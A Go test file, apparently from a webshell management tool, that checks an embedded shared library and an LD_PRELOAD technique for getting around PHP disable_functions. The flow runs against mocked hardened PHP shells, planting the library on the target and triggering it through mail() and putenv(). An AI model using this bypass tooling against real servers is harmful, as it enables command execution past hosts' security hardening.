package session

// bypass_test.go は受け入れテスト: 内蔵 freestanding .so の ELF 構造の妥当性、パススロットの
// 書き換え、LD_PRELOAD バイパスプローブの全フロー(httptest で堅牢化済み PHP eval シェルを模擬: exec 系はすべて無効、
// mail/putenv は利用可能、動的リンカがコンストラクタを実行)。プロトコル族レベルの模擬で、特定の検証環境の値は含まない。

import (
	"bytes"
	"context"
	"debug/elf"
	"encoding/binary"
	"strings"
	"testing"
)

// TestLDPreloadLibELF: 内蔵 .so は正当な x86_64 ET_DYN で、RX セグメント内のコンストラクタを指す DT_INIT_ARRAY
// を持ち、パススロット magic を含むこと——これが「ロード即証明」の構造的前提のすべて。
func TestLDPreloadLibELF(t *testing.T) {
	blob := LDPreloadLib()
	if len(blob) == 0 {
		t.Fatal("go:embed の .so が空です(ビルド成果物の欠落)")
	}
	f, err := elf.NewFile(bytes.NewReader(blob))
	if err != nil {
		t.Fatalf("ELF の解析に失敗しました: %v", err)
	}
	if f.Class != elf.ELFCLASS64 || f.Machine != elf.EM_X86_64 || f.Type != elf.ET_DYN {
		t.Fatalf("class/machine/type = %v/%v/%v", f.Class, f.Machine, f.Type)
	}
	// PT_DYNAMIC に DT_INIT_ARRAY が必須(配列は RW セグメントの 0x1000、内容は 0x100 のコンストラクタを指す)。
	var initAddr, initSz uint64
	for _, p := range f.Progs {
		if p.Type != elf.PT_DYNAMIC {
			continue
		}
		d := blob[p.Off : p.Off+p.Filesz]
		for i := 0; i+16 <= len(d); i += 16 {
			tag := binary.LittleEndian.Uint64(d[i:])
			val := binary.LittleEndian.Uint64(d[i+8:])
			if tag == 25 {
				initAddr = val
			}
			if tag == 27 {
				initSz = val
			}
		}
	}
	if initAddr != 0x1000 || initSz != 8 {
		t.Fatalf("DT_INIT_ARRAY = %#x/%d, want 0x1000/8", initAddr, initSz)
	}
	if ctor := binary.LittleEndian.Uint64(blob[0x1000:]); ctor != 0x100 {
		t.Fatalf("init_array の内容 = %#x, want 0x100(コンストラクタ入口)", ctor)
	}
	if !bytes.Contains(blob, []byte(ldpreloadMagic)) {
		t.Fatal("パススロット magic がない(patchLDPreloadPath が位置を特定できない)")
	}
	// コンストラクタの先頭バイトは mov eax,2(sys_open)——手書き機械語の最低限の自己検証。
	if blob[0x100] != 0xB8 || blob[0x101] != 0x02 {
		t.Fatalf("コンストラクタ入口のバイトが異常: % x", blob[0x100:0x108])
	}
}

// TestPatchLDPreloadPath: パススロットの書き換え——パスの書き込み、NUL 終端、残余のゼロ埋め、異常入力。
func TestPatchLDPreloadPath(t *testing.T) {
	blob := LDPreloadLib()
	const mark = "/tmp/.artex_deadbeef.mark"
	out, err := patchLDPreloadPath(blob, mark)
	if err != nil {
		t.Fatalf("patch: %v", err)
	}
	i := bytes.Index(out, []byte(ldpreloadMagic))
	if i < 0 {
		t.Fatal("magic がない")
	}
	slot := out[i+len(ldpreloadMagic) : i+len(ldpreloadMagic)+ldpreloadPathLen]
	if !bytes.HasPrefix(slot, []byte(mark)) || slot[len(mark)] != 0 {
		t.Fatalf("スロットの内容が異常: %q", slot[:len(mark)+8])
	}
	for _, b := range slot[len(mark):] {
		if b != 0 {
			t.Fatal("スロットの残余がゼロ埋めされていない(前回のパスが残る)")
		}
	}
	// 元の blob は変更されない。
	if !bytes.Equal(blob, LDPreloadLib()) {
		t.Fatal("patch が元の内蔵 blob を変更した")
	}
	if _, err := patchLDPreloadPath(blob, ""); err == nil {
		t.Fatal("空のパスはエラーになるべき")
	}
	if _, err := patchLDPreloadPath(blob, strings.Repeat("a", ldpreloadPathLen)); err == nil {
		t.Fatal("長すぎるパスはエラーになるべき")
	}
	if _, err := patchLDPreloadPath([]byte("no magic here"), "/tmp/x"); err == nil {
		t.Fatal("magic がない場合はエラーになるべき")
	}
}

// 堅牢化済み PHP eval シェル: exec 系をすべて無効 + mail/putenv は利用可能(振り返り R1 の実戦形態)。
func hardenedPHPMock(works bool) *phpMock {
	mock := newPHPMock("eval")
	for _, fn := range phpExecFuncs {
		mock.disable(fn)
	}
	mock.mu.Lock()
	mock.mailOn, mock.putenvOn, mock.bypassWorks = true, true, works
	mock.mu.Unlock()
	return mock
}

// TestProbeBypassLDPreloadConfirmed: コンストラクタの疎通確認 → bypass=ld_preload を登録し、
// .so を目標側に残し、Secret の保存・復元を往復してもバイパス情報が失われない。
func TestProbeBypassLDPreloadConfirmed(t *testing.T) {
	mock := hardenedPHPMock(true)
	u := probeURL(t, mock)
	sh, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if !info.DisableFunctions || !info.Mail || !info.Putenv {
		t.Fatalf("フィンガープリント = %+v", info)
	}
	if info.Bypass != "ld_preload" || info.BypassLib == "" {
		t.Fatalf("bypass が登録されていない: %+v", info)
	}
	if !strings.Contains(info.BypassNote, "疎通確認") {
		t.Fatalf("BypassNote = %q", info.BypassNote)
	}
	// .so は投与済みで記録も残る(後続の session_exec バイパス実行への導線)。
	if so, ok := mock.fs.readFile(info.BypassLib); !ok || len(so) != len(LDPreloadLib()) {
		t.Fatalf(".so の投与が異常: ok=%v len=%d", ok, len(so))
	}
	// 投与した .so のパススロットは今回の疎通確認マーカーパスに書き換え済み(出荷時の全ゼロではない)。
	so, _ := mock.fs.readFile(info.BypassLib)
	i := bytes.Index(so, []byte(ldpreloadMagic))
	slot := so[i+len(ldpreloadMagic) : i+len(ldpreloadMagic)+ldpreloadPathLen]
	if !strings.HasPrefix(string(slot), defaultTmpPrefix) || !strings.HasSuffix(strings.TrimRight(string(slot), "\x00"), ".mark") {
		t.Fatalf("パススロットが疎通確認マーカーパスに書き換えられていない: %q", slot)
	}
	// disable_functions 下の Exec エラーはバイパス登録と導線を明示し、「検知された」と軽率に断定しない。
	_, _, err = sh.Exec(context.Background(), "id", 0)
	if err == nil || !strings.Contains(err.Error(), "ld_preload") || !strings.Contains(err.Error(), "拡張点") {
		t.Fatalf("Exec エラーの意味 = %v", err)
	}
	// Secret の保存・復元の往復: バイパス情報は復元時に引き継がれ、再プローブ不要。
	sec := sh.Secret()
	if !sec.DisableFunctions || sec.Bypass != "ld_preload" || sec.BypassLib == "" {
		t.Fatalf("secret = %+v", sec)
	}
	got, err := RestoreHTTPShell(9, sec)
	if err != nil {
		t.Fatalf("Restore: %v", err)
	}
	_, _, err = got.Exec(context.Background(), "id", 0)
	if err == nil || !strings.Contains(err.Error(), "ld_preload") {
		t.Fatalf("復元後の Exec エラーの意味 = %v", err)
	}
}

// TestProbeBypassConstructorNotRun: コンストラクタが実行されない(mail が子プロセスを起動しない/ローダが拒否)
// → 利用不可と正直に報告し、投与済みの .so を削除する。利用可能を偽装しない。
func TestProbeBypassConstructorNotRun(t *testing.T) {
	mock := hardenedPHPMock(false)
	u := probeURL(t, mock)
	_, info, err := Probe(context.Background(), u, "cmd", "auto")
	if err != nil {
		t.Fatalf("登録がバイパスプローブに引きずられてはいけない: %v", err)
	}
	if info.Bypass != "" || info.BypassLib != "" {
		t.Fatalf("バイパス利用可能を偽装してはいけない: %+v", info)
	}
	if !strings.Contains(info.BypassNote, "コンストラクタ未実行") {
		t.Fatalf("BypassNote = %q", info.BypassNote)
	}
	if mock.fs.hasPrefixMatch(defaultTmpPrefix) {
		t.Fatal("バイパス不可時は投与済みの .so を削除するべき")
	}
}

// TestProbeBypassPreconditionMissing: mail/putenv が揃って利用可能でない → 前提を満たさないとだけ記録し、
// 投与/発火プローブは送らない。
func TestProbeBypassPreconditionMissing(t *testing.T) {
	mock := newPHPMock("eval")
	for _, fn := range phpExecFuncs {
		mock.disable(fn)
	}
	u := probeURL(t, mock)
	_, info, err := Probe(context.Background(), u, "cmd", "php")
	if err != nil {
		t.Fatalf("Probe: %v", err)
	}
	if !info.DisableFunctions || info.Mail || info.Putenv {
		t.Fatalf("フィンガープリント = %+v", info)
	}
	if info.Bypass != "" || !strings.Contains(info.BypassNote, "前提を満たしません") {
		t.Fatalf("bypass の結論 = %+v", info)
	}
	if mock.fs.hasPrefixMatch(defaultTmpPrefix) {
		t.Fatal("前提を満たさない場合はファイルを投与してはいけない")
	}
}
